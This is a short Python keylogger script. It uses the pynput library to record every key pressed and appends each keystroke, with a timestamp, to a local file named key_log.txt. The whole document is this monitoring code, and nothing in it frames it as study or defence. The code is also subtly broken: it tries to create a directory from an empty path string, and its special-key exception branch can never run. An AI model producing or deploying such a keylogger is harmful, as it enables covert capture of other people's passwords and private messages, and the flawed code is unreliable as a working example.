import os
import logging
from pynput.keyboard import Key, Listener

# create a directory to save the log file
log_dir = ""
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# create a log file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# function to write the key strokes to the log file
def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info("Special key {0} pressed".format(key))

# create a listener to monitor the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
